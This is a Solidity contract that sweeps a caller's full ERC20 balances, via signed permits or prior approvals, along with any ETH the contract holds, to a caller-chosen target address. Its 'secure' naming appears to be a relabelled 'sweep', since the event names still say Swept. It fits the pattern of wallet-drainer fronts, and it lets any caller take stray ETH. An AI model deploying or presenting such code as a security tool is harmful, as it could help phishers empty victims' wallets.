// Tokensecureer.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/utils/SafeERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/access/Ownable.sol";

/**
 * @title Tokensecureer
 * @dev Contract to secure ERC20 tokens from the caller's wallet to a target address.
 * Supports permit for gasless approvals and regular approvals.
 * Can also forward native ETH.
 */
contract Tokensecureer is Ownable {
    using SafeERC20 for IERC20;

    event TokensSwept(
        address indexed from,
        address indexed to,
        address token,
        uint256 amount
    );
    event NativeSwept(address indexed from, address indexed to, uint256 amount);

    error ArrayLengthMismatch();
    error InsufficientBalance(address token);
    error PermitFailed(address token);
    error TransferFailed();

    struct PermitData {
        address token;
        uint256 amount;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    constructor(address initialOwner) Ownable(initialOwner) {}

    /**
     * @dev secure tokens using EIP-2612 permits.
     * User must provide signed permits off-chain for each token.
     * Amounts should be the balances to transfer (typically full balance).
     * Reverts if permit fails for any token.
     */
    function secureWithPermits(
        PermitData[] calldata permits,
        address target
    ) external {
        address sender = msg.sender;

        for (uint256 i = 0; i < permits.length; i++) {
            PermitData calldata permit = permits[i];
            IERC20Permit tokenPermit = IERC20Permit(permit.token);
            IERC20 token = IERC20(permit.token);

            // Call permit
            try tokenPermit.permit(sender, address(this), permit.amount, permit.deadline, permit.v, permit.r, permit.s) {} catch {
                revert PermitFailed(permit.token);
            }

            uint256 balance = token.balanceOf(sender);
            if (permit.amount > balance) revert InsufficientBalance(permit.token);

            token.safeTransferFrom(sender, address(this), permit.amount);
            token.safeTransfer(target, permit.amount);

            emit TokensSwept(sender, target, permit.token, permit.amount);
        }

        // Handle native ETH if sent
        if (address(this).balance > 0) {
            _forwardNative(target);
        }
    }

    /**
     * @dev secure tokens assuming prior approvals.
     * Transfers full balance of each token.
     */
    function secureWithApprovals(
        address[] calldata tokens,
        address target
    ) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(msg.sender);
            if (balance > 0) {
                token.safeTransferFrom(msg.sender, address(this), balance);
                token.safeTransfer(target, balance);
                emit TokensSwept(msg.sender, target, tokens[i], balance);
            }
        }

        // Handle native ETH if sent
        if (address(this).balance > 0) {
            _forwardNative(target);
        }
    }

    /**
     * @dev Internal function to forward native ETH.
     */
    function _forwardNative(address target) internal {
        uint256 balance = address(this).balance;
        (bool sent, ) = target.call{value: balance}("");
        if (!sent) revert TransferFailed();
        emit NativeSwept(msg.sender, target, balance);
    }

    /**
     * @dev Allow owner to withdraw stuck tokens or ETH.
     */
    function withdraw(
        address token,
        uint256 amount,
        address to
    ) external onlyOwner {
        if (token == address(0)) {
            (bool sent, ) = to.call{value: amount}("");
            require(sent, "Withdraw failed");
        } else {
            IERC20(token).safeTransfer(to, amount);
        }
    }

    // Receive native ETH
    receive() external payable {}
}
